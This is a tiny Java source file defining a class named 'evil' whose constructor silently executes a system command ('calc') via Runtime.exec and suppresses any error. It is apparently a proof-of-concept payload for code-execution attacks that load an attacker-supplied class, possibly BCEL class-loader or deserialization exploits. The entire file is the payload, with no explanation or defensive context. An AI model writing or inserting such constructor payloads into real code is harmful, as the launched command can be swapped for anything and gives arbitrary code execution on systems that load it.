package com.bcel;

import java.io.IOException;

public class evil {
    public evil()
    {
        try
        {
            Runtime.getRuntime().exec("calc");
        }
        catch(Exception e){}
    }
}
